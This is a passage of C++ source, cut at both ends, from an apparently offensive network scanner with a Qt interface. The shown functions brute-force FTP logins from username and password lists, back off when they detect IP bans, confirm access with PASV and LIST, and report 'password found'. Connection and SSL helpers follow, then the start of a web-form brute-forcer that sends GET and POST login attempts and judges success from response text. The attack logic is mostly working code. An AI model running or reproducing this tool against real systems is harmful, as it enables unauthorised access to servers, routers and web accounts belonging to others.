						|| strstr(recvBuff, "421 Too many") != NULL || strstr(recvBuff, "from this IP") != NULL  || strstr(recvBuff, "from your IP") != NULL) 
					{
#pragma region QTGUI_Area
						stt->doEmition_BARedData("[-] 503 - Ban detected? Waiting 1 min (" + QString(ip) + ":" + QString::number(port) + ")");
#pragma endregion
						shutdown(sockFTP, SD_BOTH);
						closesocket(sockFTP);
						closedSocket = 1;
						if(j > 0) --j;
						ZeroMemory(recvBuff, sizeof(recvBuff));
						Sleep(60000);
						break;
					}
					else if( (strstr(recvBuff, "220 ") != NULL || loginFailedFlag == 1 || strstr(recvBuff, "503") != NULL || strstr(recvBuff, "server ready") != NULL ))
					{
						strcpy(request, "USER ");
						if(strlen(loginLst[i]) != 0) strcat(request, loginLst[i]);
						else 
						{
							loginFailedFlag = 1;
							ZeroMemory(recvBuff, sizeof(recvBuff));
							break;
						};
						strcat(request, "\r\n");
						if(send(sockFTP, request, strlen(request), 0) != SOCKET_ERROR)
						{
							if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
							Activity += strlen(request);

							ZeroMemory(request, sizeof(request));
						}
						else
						{
							stt->doEmitionRedFoundData("[FTP] Send error. " + QString(ip) + ":" + QString::number(port));
						};
					}
					else if(strstr(recvBuff, "530") != NULL || strstr(recvBuff, "Login incorrect") != NULL 
						|| strstr(recvBuff, "500 OOPS") != NULL|| strstr(recvBuff, "500 oops") != NULL) 
					{	
						loginFailedFlag = 1;
						ZeroMemory(recvBuff, sizeof(recvBuff));
						break;
					}
					else if(strstr(recvBuff, "331") != NULL)
					{
						if((strstr(recvBuff, "530 Non-anonymous sessions must use encryption") != NULL) ||
							(strstr(recvBuff, "331 Non-anonymous sessions must use encryption") != NULL) || 
							(strstr(recvBuff, "331 Rejected--secure connection required") != NULL) 
							)
						{
							stt->doEmition_BARedData("FTP server (" + QString(ip) + ") appears to require SSL for specified user: " + QString(loginLst[i]));
							shutdown(sockFTP, SD_BOTH);
							closesocket(sockFTP);

							OnLiner = 0;
							closedSocket = 1;

							strcpy(lps.login, "UNKNOWN");
							return lps;
						}
						else if(strstri(recvBuff, "permission denied") == NULL)
						{
							strcpy(request, "PASS ");
							if(strlen(passLst[j]) != 0) strcat(request, passLst[j]);
							else 
							{
								loginFailedFlag = 1;
								ZeroMemory(recvBuff, sizeof(recvBuff));
								break;
							};
							strcat(request, "\r\n");
							if(send(sockFTP, request, strlen(request), 0) != SOCKET_ERROR)
							{
								if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));

								Activity += strlen(request);
								ZeroMemory(request, sizeof(request));

								if(BALogSwitched) stt->doEmitionBAData("Probing " + QString(ip) + ":" + QString::number(port) + "; login/pass: " + QString(loginLst[i]) + ":" + QString(passLst[j]));
							}
							else
							{
								stt->doEmitionRedFoundData("[FTP] Send error. " + QString(ip) + ":" + QString::number(port));
							};
						}
						else
						{
							breakPassLoop = 1;
							stt->doEmition_BARedData("Permission denied for login - " + QString(ip) + ":" + QString::number(port) + "; login: " + QString(loginLst[i]));
							break;
						};
					}
					else if(strstr(recvBuff, "230") != NULL)
					{
						char pass[128] = {0};

						strcpy(pass, ip);
						strcat(pass, " - FTP Password found: ");
						strcat(pass, loginLst[i]);
						strcat(pass, ":");
						strcat(pass, passLst[j]);

						char recvBuff2[2048] = {0};
						if(send(sockFTP, "PASV\r\n", 6, 0) != SOCKET_ERROR)
						{
							int x = 1, xx = 0;
							while(x != 0)
							{
								ZeroMemory(recvBuff, sizeof(recvBuff));
								x = recvWT(sockFTP, recvBuff, 512, gTimeOut + 5, &bTO);
								xx += x;
								if(xx < 1536) strcat(recvBuff2, recvBuff);
								else break;
							};

							if(strstri(recvBuff2, "unknown command") != NULL || strstri(recvBuff2, "invalid command") != NULL)
							{
								stt->doEmitionYellowFoundData("[-] PASV failed. Router detected?");
								shutdown(sockFTP, SD_BOTH);
								closesocket(sockFTP);
								strcpy(lps.login, loginLst[i]);
								strcpy(lps.pass, passLst[j]);
								strcpy(lps.other, "ROUTER");
								closedSocket = 1;
								OnLiner = 0;
								return lps;
							};

#pragma region Get pasv Port
							char *ptr0 = strstr(recvBuff2, "227 ");
							if( ptr0 != NULL )
							{
								if(strstr(ptr0, "(") != NULL)
								{
									char pasvData[32] = {0};
									char *ptr1 = strstr(ptr0, "(");
									char *ptr2 = strstr(ptr0, ")");
									int sz = ptr2 - ptr1 - 1;
									strncpy(pasvData, ptr1 + 1, sz);
									char *ptr3 = strstr(pasvData, ",");
									ptr3 = strstr(ptr3 + 1, ",");
									ptr3 = strstr(ptr3 + 1, ",");
									ptr3 = strstr(ptr3 + 1, ",");

									if(ptr3 != NULL)
									{
										char *ptrP2 = strstr(ptr3 + 1, ",");
										char p1c[8] = {0};
										sz = ptrP2 - ptr3 - 1;
										strncpy(p1c, ptr3 + 1, sz);
										int p1 = atoi(p1c);
										int p2 = atoi(ptrP2 + 1);
										port = p1 * 256 + p2;

										sockAddr.sin_port = htons(port);
										SOCKET newSockFTP = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
										connectionResult = connect(newSockFTP, (sockaddr*)&sockAddr, sizeof(sockAddr));

										send(sockFTP, "LIST\r\n", 6, 0);

										ZeroMemory(recvBuff, sizeof(recvBuff));
										int x = recvWT(newSockFTP, recvBuff, sizeof(recvBuff), gTimeOut + 5, &bTO);
										if(x <= 0) 
										{
											stt->doEmition_BAGreenData("[*] " + QString(pass) + " [LIST failed]");
										}
										else
										{
											if(strstr(recvBuff, "unknown command") != NULL)
											{
												stt->doEmition_BARedData("[-] LIST failed.");
												shutdown(sockFTP, SD_BOTH);
												closesocket(sockFTP);
												shutdown(newSockFTP, SD_BOTH);
												closesocket(newSockFTP);
												closedSocket = 1;			
												OnLiner = 0;
												strcpy(lps.login, "UNKNOWN");
												return lps;
											}
											else stt->doEmition_BAGreenData("[+] " + QString(pass) + " [LIST succeeded]");
										};
										shutdown(newSockFTP, SD_BOTH);
										closesocket(newSockFTP);
									}
									else
									{
#pragma region QTGUI_Area
										stt->doEmitionYellowFoundData("[*] " + QString(ip) + " [PASV failed]");
#pragma endregion
									};
								}
								else
								{
									stt->doEmitionYellowFoundData("[*] " + QString(ip) + " [PASV TO] Failed!");
								};
							}
							else
							{
								stt->doEmitionYellowFoundData("[*] " + QString(ip) + " [PASV TO] Failed!");
							};
#pragma endregion

							if(strlen(recvBuff) > 1)
							{
								strcpy(ps->headr, "</a><pre><font color=\"goldenrod\"> (");
								strncat(ps->headr, recvBuff, 256);
								strcat(ps->headr, ")</font></pre>");
							};

							strcpy(lps.login, loginLst[i]);
							strcpy(lps.pass, passLst[j]);

							shutdown(sockFTP, SD_BOTH);
							closesocket(sockFTP);
							OnLiner = 0;
							closedSocket = 1;
							return lps;
						}
						else
						{
							stt->doEmitionRedFoundData("[FTP] Send error. " + QString(ip) + ":" + QString::number(port));

							strcpy(lps.login, loginLst[i]);
							strcpy(lps.pass, passLst[j]);

							shutdown(sockFTP, SD_BOTH);
							closesocket(sockFTP);
							OnLiner = 0;
							closedSocket = 1;
							return lps;
						};
					};
				};
				shutdown(sockFTP, SD_BOTH);
				closesocket(sockFTP);
				closedSocket = 1;
				ZeroMemory(recvBuff, sizeof(recvBuff));
			}
			else
			{
				char err[128] = {0};

				int WSAerr;
				if(connectionResult == -1) WSAerr = WSAGetLastError();
				else WSAerr = 10060;

				if(gThreads > 1 && WSAerr != 10060/*Timeout*/ && WSAerr != 10055/*POOLOVERFLOW*/ && WSAerr != 10061/*WSAECONNREFUSED*/ && WSAerr != 10054/*WSACONNABORTED*/ && WSAerr != 0) 
				{
					strcpy(err, "[FTPBrute] Cannot connect to ");
					strcat(err, ip);
					strcat(err, " [");
					strcat(err, std::to_string((long double)WSAerr).c_str());
					strcat(err, "]");

#pragma region QTGUI_Area
					stt->doEmitionRedFoundData(QString(err));
#pragma endregion
				};

				shutdown(sockFTP, SD_BOTH);
				closesocket(sockFTP);
				closedSocket = 1;			
				OnLiner = 0;
				strcpy(lps.login, "UNKNOWN");
				return lps;
			};
			Sleep(100);

			if(breakPassLoop) 
			{
				breakPassLoop = false;
				break;
			};
		};
	};

	shutdown(sockFTP, SD_BOTH);
	closesocket(sockFTP);

	OnLiner = 0;

	strcpy(lps.login, "UNKNOWN");
	return lps;
};

int Connector::_EstablishSSLConnection(char *iph, int porth, char *requesth, conSTR *CSTR)
{
	SSL *ssl = NULL;
	int bytes = 0;
	char *recvBuff2 = 0;
	int resCode = 0;

	SSL_library_init();

	SSL_CTX *ctx = InitCTX();
	SOCKET sock = OpenConnection(iph, porth);
	if(sock >= 0)
	{
		ssl = SSL_new(ctx);      /* create new SSL connection state */
		SSL_set_fd(ssl, sock);    /* attach the socket descriptor */

		if(SSL_connect(ssl))
		{
			SSL_write(ssl, requesth, strlen(requesth));
			if(MapWidgetOpened) stt->doEmitionAddOutData(QString(iph), QString(requesth));

			int x = 256;
			char recvBuff[8192] = {0};
			recvBuff2 = new char[RECV_MAX_LENGTH];
			ZeroMemory(recvBuff2, RECV_MAX_LENGTH);

			while (x > 0)		
			{
				ZeroMemory(recvBuff, sizeof(recvBuff));
				x = SSL_read(ssl, recvBuff, sizeof(recvBuff));
				if(x <= 0) break;

				bytes += x;
				Activity += x;

				if( bytes > RECV_MAX_LENGTH ) 
				{
					if(strstri(recvBuff2, "http/1.") == NULL)
					{
						if(HTMLDebugMode) _DebugWriteHTMLToFile(requesth, recvBuff2);
						delete[] recvBuff2;
						recvBuff2 = NULL;
						shutdown(sock, SD_BOTH);
						closesocket(sock);
						++Overl;

						CSTR->lowerBuff = new char[11];
						strcpy(CSTR->lowerBuff, "[OVERFLOW]");
						CSTR->size = 10;
						SSL_free(ssl);
						SSL_CTX_free(ctx);        /* release context */
						return 0;
					} 
					else break;
				};
				if(globalScanFlag == true)
				{
					if(x > 0)
					{
						memset((void*)(recvBuff + x), '\0', 1);
						strcat(recvBuff2, recvBuff);
					}
					else
					{
						if(HTMLDebugMode) _DebugWriteHTMLToFile(requesth, recvBuff2);

						delete[] recvBuff2;
						recvBuff2 = NULL;
						shutdown(sock, SD_BOTH);
						closesocket(sock);
						CSTR->lowerBuff = new char[12];
						strcpy(CSTR->lowerBuff, "[IGNR_ADDR]");

						CSTR->size = 11;
						SSL_free(ssl);
						SSL_CTX_free(ctx);        /* release context */
						return 0;
					};
				};
			};

			if(bytes < 0)
			{
				stt->doEmitionRedFoundData("[SSL error] (_SSLConnect [bytes < 0]) " + QString(iph) + ":" + QString::number(porth));
			};

			SSL_free(ssl);
			shutdown(sock, SD_BOTH);
			closesocket(sock);         /* close socket */
			SSL_CTX_free(ctx);        /* release context */

			if(bytes == 0 || recvBuff2 == NULL)
			{
				if(recvBuff2 != NULL) delete []recvBuff2;
				recvBuff2 = NULL;
				CSTR->lowerBuff = new char[1];
				strcpy(CSTR->lowerBuff, "");
				CSTR->size = 0;
				return 0;
			};
			if(MapWidgetOpened) stt->doEmitionAddIncData(QString(iph), QString(recvBuff2));
			std::string res2 = "";
			if(strlen(recvBuff2) > bytes) bytes = strlen(recvBuff2);
			CSTR->lowerBuff = new char[bytes + 1];
			ZeroMemory(CSTR->lowerBuff, sizeof(CSTR->lowerBuff));

			strncpy(CSTR->lowerBuff, recvBuff2, bytes);

			delete[] recvBuff2;
			recvBuff2 = NULL;
			CSTR->size = bytes;
			if(HTMLDebugMode) _DebugWriteHTMLToFile(requesth, CSTR->lowerBuff);
			return 0;
		}
		else
		{
			delete[] recvBuff2;
			recvBuff2 = NULL;
			shutdown(sock, SD_BOTH);
			closesocket(sock);         /* close socket */
			SSL_free(ssl);
			SSL_CTX_free(ctx);        /* release context */
			CSTR->lowerBuff = new char[1];
			strcpy(CSTR->lowerBuff, "");
			CSTR->size = 0;
			return 0;
		};
	}
	else
	{
		CSTR->lowerBuff = new char[1];
		strcpy(CSTR->lowerBuff, "");
		CSTR->size = 0;
		return 0;
	};
};
void __deleteExcessiveNullBytes(char *buff, int sz)
{
	int j = 0;
	for(int i = 0; i < sz - 1; ++i)
	{
		if(buff[i] != 0) buff[j++] = buff[i];
	};
};
struct linger linger = { 0 };
int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *CSTR, int force)
{
	CSTR->lowerBuff = NULL;
	if(strlen(ip) == 0) 
	{	
		if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad IP.");
		return -1;
	};
	if(port < 0 || port > 65535) 
	{
		if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad port.");
		return -1;
	};

	int recvBuffSize = 0;
	char *recvBuff2 = NULL;
	char request[2049] = {0};
	strcpy(request, requesth);
	sockaddr_in sockAddr;  
	sockAddr.sin_family = AF_INET;  
	sockAddr.sin_port = htons(port);

	HOSTENT *host;  
#if defined(WIN32)
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
	else if(host = gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
	else 
	{
		++offlines;
		if(mode != 1) 
		{
			char temp[256] = {0};
			strcpy(temp, "[Error - Bad Address (");

			strcat(temp, ip);
			strcat(temp, ":");
			strcat(temp, std::to_string((long double)port).c_str());
			strcat(temp, "):");
			strcat(temp, std::to_string((long double)WSAGetLastError()).c_str());
			strcat(temp, "]");

#pragma region QTGUI_Area
			stt->doEmitionRedFoundData("[CRITICAL] " + QString(temp));
#pragma endregion

		};
		return -1;

	};
#else
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
	else 
	{
		if(mode != 1) 
		{
			++offlines;
			char temp[256] = {0};
			strcpy(temp, "[Error - Bad Address (");

			strcat(temp, ip);
			strcat(temp, ":");
			strcat(temp, std::to_string((long double)port).c_str());
			strcat(temp, "):");
			strcat(temp, std::to_string((long double)WSAGetLastError()).c_str());
			strcat(temp, "]");

#pragma region QTGUI_Area
			stt->doEmitionRedFoundData("[CRITICAL] " + QString(temp));
#pragma endregion

			return -1;
		}
		else
		{
			++offlines;
			return -1;
		};
	};
#endif

	SOCKET sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	while(sock == INVALID_SOCKET)
	{
		char temp[64] = {0};
		strcpy(temp, "Cannot create socket - ");
		strcat(temp, std::to_string((long double)WSAGetLastError()).c_str());
		strcat(temp, " - ");
		strcat(temp, ip);
		strcat(temp, ":");
		strcat(temp, std::to_string((long double)port).c_str());

#pragma region QTGUI_Area
		stt->doEmitionRedFoundData("[CRITICAL] " + QString(temp));
#pragma endregion

		shutdown(sock, SD_BOTH);
		closesocket(sock);
		Sleep(500);
		sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	};

	int iiError = WSAGetLastError();
	while(iiError == 10038)
	{
		if(gDebugMode) stt->doEmitionDebugFoundData("[ConnectTo] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");

		shutdown(sock, SD_BOTH);
		closesocket(sock);
		sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
		iiError = WSAGetLastError();
	};
#if defined(WIN32)
	u_long FAR cmd = 1;
	if( ioctlsocket( sock , FIONBIO, &cmd ) != 0 )
#else
	u_long cmd = 1;
	if( fcntl( sock , F_SETFL, O_NDELAY ) == -1 )
#endif
	{
		char temp[64] = {0};
		strcpy(temp, "Error setting non-blocking mode - ");
		strcat(temp, std::to_string((long double)WSAGetLastError()).c_str());
		strcat(temp, " - ");
		strcat(temp, ip);
		strcat(temp, ":");
		strcat(temp, std::to_string((long double)port).c_str());

#pragma region QTGUI_Area
		stt->doEmitionRedFoundData("[CRITICAL] " + QString(temp));
#pragma endregion

		shutdown(sock, SD_BOTH);
		closesocket(sock);
	}


	int on = 1;
	int status = setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (const char *) &on, sizeof(on));

	linger.l_onoff = 1;
	linger.l_linger = 30;
	status = setsockopt(sock, SOL_SOCKET, SO_LINGER, (const char *) &linger, sizeof(linger));

	int iError, iResult = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));

	if(iResult == SOCKET_ERROR)
	{
		iError = WSAGetLastError();
		while(iError == 10038)
		{
			if(gDebugMode) stt->doEmitionDebugFoundData("[ConnectTo] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");

			shutdown(sock, SD_BOTH);
			closesocket(sock);
			sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
			iResult = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
			iError = WSAGetLastError();
		};
		if(iError == 10035)
		{
			fd_set read_fs;
			FD_ZERO(&read_fs); 
			FD_SET(sock, &read_fs);
			timeval tv = { gTimeOut, 0 };

			int res2 = select(sock + 1, NULL, &read_fs, 0, &tv);

			int cErrCode = WSAGetLastError();

			while(cErrCode == 10038)
			{
				if(gDebugMode) stt->doEmitionDebugFoundData("[ConnectTo] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");

				shutdown(sock, SD_BOTH);
				closesocket(sock);
				FD_CLR(sock, &read_fs); 
				sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
				connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
				res2 = WSAGetLastError();
				if(res2 == 10038) continue;
				FD_SET(sock, &read_fs);
				res2 = select(sock + 1, NULL, &read_fs, 0, &tv);
				cErrCode = WSAGetLastError();
			};

			if (res2 == SOCKET_ERROR) 
			{
				++offlines;
				char temp[128] = {0};
				strcpy(temp, "[Omitting IP!] Select error - ");
				strcat(temp, std::to_string((long double)cErrCode).c_str());
				strcat(temp, " - ");
				strcat(temp, ip);
				strcat(temp, ":");
				strcat(temp, std::to_string((long double)port).c_str());
				strcat(temp, ";");
#pragma region QTGUI_Area
				stt->doEmitionRedFoundData(QString(temp));
#pragma endregion
				ZeroMemory(temp, strlen(temp));
			}
			else
			{
				if (!res2) 
				{
					++offlines;
				}
				else
				{
					if(send(sock, request, strlen(request), 0) != SOCKET_ERROR) 
					{
						if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
						Activity += strlen(request);
						cmd = 0;
						Lexems fd;
						int x = 256;
						char recvBuff[4096] = {0};
						recvBuff2 = new char[RECV_MAX_LENGTH];
						ZeroMemory(recvBuff2, RECV_MAX_LENGTH);

						int bTO;
						while (x > 0)				
						{
							ZeroMemory(recvBuff, 4096);
							x = recvWT(sock, recvBuff, 4096, gTimeOut, &bTO);
							if(x <= 0) break;

							Activity += x;
							recvBuffSize += x;

							if( recvBuffSize > RECV_MAX_LENGTH ) 
							{ 
								if(strstri(recvBuff2, "http/1.") == NULL)
								{
									delete[] recvBuff2;
									recvBuff2 = NULL;

									FD_CLR(sock, &read_fs);
									shutdown(sock, SD_BOTH);
									closesocket(sock);
									++Overl;

									CSTR->lowerBuff = new char[11];
									strcpy(CSTR->lowerBuff, "[OVERFLOW]");
									CSTR->size = 10;
									return 0;
								} 
								else break;
							};
							if(globalScanFlag == true || force)
							{
								if(x > 0)
								{
									memset((void*)(recvBuff + x), '\0', 1);

									strcat(recvBuff2, recvBuff);
									if((strstr(recvBuff, "220") || strstr(recvBuff, "500 'GET':")) && port == 21) 
									{							
										break;
									};

									if(strstri(recvBuff, "220 FTP server ready") != NULL
										|| strstri(recvBuff, "220 DiskStation FTP server ready") != NULL
										|| strstri(recvBuff, "500 'GET': command not understood") != NULL
										)
									{
										delete[] recvBuff2;
										recvBuff2 = NULL;
										FD_CLR(sock, &read_fs);
										shutdown(sock, SD_BOTH);
										closesocket(sock);

										CSTR->lowerBuff = new char[recvBuffSize + 1];
										strcpy(CSTR->lowerBuff, recvBuff);
										CSTR->size = recvBuffSize;
										return 0;
									};							
								};
							};
						};
					}
					else
					{
						++offlines;
						char temp[128] = {0};
						strcpy(temp, "Send error! - ");
						strcat(temp, std::to_string((long double)WSAGetLastError()).c_str());
						strcat(temp, " - ");
						strcat(temp, ip);
						strcat(temp, "; sock: ");
						strcat(temp, std::to_string((long double)sock).c_str());

#pragma region QTGUI_Area
						stt->doEmitionRedFoundData("[CRITICAL] " + QString(temp));
#pragma endregion
						ZeroMemory(temp, strlen(temp));
					};
				};
			};
			FD_CLR(sock, &read_fs);
			shutdown(sock, SD_BOTH);
			closesocket(sock);
		}
		else 
		{
			++offlines;
			char temp[128] = {0};
			int err = iError;
			GlobalWSAErr = err;
			if(err == 10055) 
			{
				strcpy(temp, "-Connection pool depleted- ");

#pragma region QTGUI_Area
				stt->doEmitionRedFoundData("[SOCKERR 10055] " + QString(temp) + QString(ip) + ":" + QString::number(port));
#pragma endregion
				ZeroMemory(temp, strlen(temp));

				shutdown(sock, SD_BOTH);
				closesocket(sock);
				Sleep(60000);
			}
			else if(err == 10049)
			{
				strcpy(temp, "[ADDR_NOT_AVAIL - ");
				strcat(temp, ip);
				strcat(temp, ":");
				strcat(temp, std::to_string((long double)port).c_str());
				strcat(temp, " - ");
				strcat(temp, std::to_string((long double)err).c_str());
				strcat(temp, "]");

#pragma region QTGUI_Area
				stt->doEmitionRedFoundData(QString(temp));
#pragma endregion

				ZeroMemory(temp, strlen(temp));

				shutdown(sock, SD_BOTH);
				closesocket(sock);
			}
			else
			{
				strcpy(temp, "[Unpredictable error - ");
				strcat(temp, ip);
				strcat(temp, ":");
				strcat(temp, std::to_string((long double)port).c_str());
				strcat(temp, " - ");
				strcat(temp, std::to_string((long double)err).c_str());
				strcat(temp, "]");
				strcat(temp, "; sock: ");
				strcat(temp, std::to_string((long double)sock).c_str());
#pragma region QTGUI_Area
				stt->doEmitionRedFoundData(QString(temp));
#pragma endregion

				ZeroMemory(temp, strlen(temp));

				shutdown(sock, SD_BOTH);
				closesocket(sock);
			};
		};
	}
	else
	{
		char temp[128] = {0};
		strcpy(temp, "[?!] Strange behavior detected - ");
		strcat(temp, std::to_string((long double)WSAGetLastError()).c_str());
		strcat(temp, " - ");
		strcat(temp, ip);
		strcat(temp, ":");
		strcat(temp, std::to_string((long double)port).c_str());
		strcat(temp, "; sock: ");
		strcat(temp, std::to_string((long double)sock).c_str());
#pragma region QTGUI_Area
		stt->doEmitionRedFoundData(QString(temp));
#pragma endregion
		ZeroMemory(temp, strlen(temp));
	};

	if( globalScanFlag == false && force == 0) 
	{
		if(recvBuff2 != NULL) delete []recvBuff2;
		recvBuff2 = NULL;

		return -1;
	};

	if(recvBuff2 != NULL && recvBuffSize > 0)
	{
		if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff2));
		std::string res2 = "";
		if(strlen(recvBuff2) > recvBuffSize) recvBuffSize = strlen(recvBuff2);
		CSTR->lowerBuff = new char[recvBuffSize + 1];
		ZeroMemory(CSTR->lowerBuff, sizeof(CSTR->lowerBuff));
		CSTR->size = recvBuffSize;
		strncpy(CSTR->lowerBuff, recvBuff2, recvBuffSize);
		memset(CSTR->lowerBuff + (recvBuffSize), '\0', 1);

		delete []recvBuff2;
		recvBuff2 = NULL;
		if(HTMLDebugMode) _DebugWriteHTMLToFile(requesth, CSTR->lowerBuff);
		return 0;
	}
	else 
	{
		if(recvBuff2 != NULL) delete []recvBuff2;
		recvBuff2 = NULL;
		return -1;
	};
};

#pragma region WF
lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionVal, char *userVal, char *passVal, char *formVal)
{
	lopaStr lps;
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));

	char b[16] = {0};
	char request[2048] = {0};
	char argData[256] = {0};
	char recvBuffer[65536] = {0};

	Connector con;
	conSTR CSTR;
	int cRes;

	if(strstri(methodVal, "get") != NULL)
	{
		for(int i = 0; i < MaxWFLogin; ++i)
		{
			for(int j = 0; j < MaxWFPass; ++j)
			{
				CSTR.lowerBuff = NULL;
				CSTR.size = 0;
				cRes = 0;

				strcpy(request, "GET ");
				strcat(request, actionVal);
				strcat(request, "?");
				strcat(request, userVal);
				strcat(request, "=");
				strcat(request, wfLoginLst[i]);
				strcat(request, "&");
				strcat(request, passVal);
				strcat(request, "=");
				strcat(request, wfPassLst[j]);
				strcat(request, " HTTP/1.1\r\n");
				strcat(request, "Host: ");
				strcat(request, ip);
				strcat(request, "\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: us-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nConnection: close\r\nContent-length: 0");
				strcat(request, "\r\n\r\n");

				if(BALogSwitched) stt->doEmitionBAData("Probing WF " + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(wfLoginLst[i]) + ":" + QString(wfPassLst[j]));

				if(port == 443) cRes = con._EstablishSSLConnection(ip, port, request, &CSTR);
				else cRes = con._EstablishConnection(ip, port, request, &CSTR);

				if(CSTR.lowerBuff != NULL)
				{
					if(strstri(CSTR.lowerBuff, "501 not implemented") != NULL)
					{
						stt->doEmitionRedFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: 501 Not Implemented.");						
						OnLiner = 0;
						strcpy(lps.login, "UNKNOWN");
						return lps;
					};
					if(strstri(CSTR.lowerBuff, "404 not found") != NULL)
					{
						stt->doEmitionRedFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: 404 Not Found.");						
						OnLiner = 0;
						strcpy(lps.login, "UNKNOWN");
						return lps;
					};
					if(strstri(CSTR.lowerBuff, "Access is Denied") == NULL
						&& strstri(CSTR.lowerBuff, "Location:") == NULL
						&& strstri(CSTR.lowerBuff, "Access forbidden") == NULL
						&& strstri(CSTR.lowerBuff, "Authentication required") == NULL
						&& strstri(CSTR.lowerBuff, "invalid") == NULL
						&& strstri(CSTR.lowerBuff, "error") == NULL
						&& strstri(CSTR.lowerBuff, "loginerr") == NULL
						&& strstri(CSTR.lowerBuff, "passerr") == NULL
						&& strstri(CSTR.lowerBuff, "passworderr") == NULL
						&& strstri(CSTR.lowerBuff, "location.href") == NULL
						&& strstri(CSTR.lowerBuff, "location.replace") == NULL
						&& strstri(CSTR.lowerBuff, "top.location") == NULL
						&& strstri(CSTR.lowerBuff, "error_status") == NULL
						&& strstri(CSTR.lowerBuff, "501 not implemented") == NULL
						&& strstri(CSTR.lowerBuff, "http-equiv=\"refresh\"") == NULL
						&& strstri(CSTR.lowerBuff, "http-equiv = \"refresh\"") == NULL
						&& strstri(CSTR.lowerBuff, "busy") == NULL
						&& strstri(CSTR.lowerBuff, "later") == NULL
						&& strstri(CSTR.lowerBuff, formVal) == NULL

						)
					{
						if(i == 0) 
						{
							ZeroMemory(request, 2048);

							OnLiner = 0;

							strcpy(lps.login, "UNKNOWN");
							return lps;
						};
						char pass[256] = {0};

						ZeroMemory(pass, 256);
						strcpy(pass, ip);
						strcat(pass, " - Web Form password found: ");
						strcat(pass, wfLoginLst[i]);
						strcat(pass, ":");
						strcat(pass, wfPassLst[j]);
						OnLiner = 0;
#pragma region QTGUI_Area
						stt->doEmition_BAGreenData("[+] " + QString(pass));
#pragma endregion
						strcpy(lps.login, wfLoginLst[i]);
						strcpy(lps.pass, wfPassLst[j]);
						return lps;
					};
				}
				else
				{
					ZeroMemory(request, 2048);

					OnLiner = 0;

					strcpy(lps.login, "UNKNOWN");
					return lps;
				};

				if(i == 0) ++i;
				ZeroMemory(request, 2048);
			};
		};
	}
	else if(strstri(methodVal, "post") != NULL)
	{
		for(int i = 0; i < MaxWFLogin; ++i)
		{
			for(int j = 0; j < MaxWFPass; ++j)
			{
				CSTR.lowerBuff = NULL;
				CSTR.size = 0;
				cRes = 0;

				strcpy(argData, userVal);
				strcat(argData, "=");
				strcat(argData, wfLoginLst[i]);
				strcat(argData, "&");
				strcat(argData, passVal);
				strcat(argData, "=");
				strcat(argData, wfPassLst[j]);

				strcpy(request, "POST ");
				strcat(request, actionVal);
				strcat(request, " HTTP/1.1\r\n");
				strcat(request, "Host: ");
				strcat(request, ip);
				strcat(request, "\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: us-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nConnection: close\r\n");
				strcat(request, "Content-length: ");
				strcat(request, itoa(strlen(argData), b, 10));
				strcat(request, "\r\n\r\n");

				strcat(request, argData);

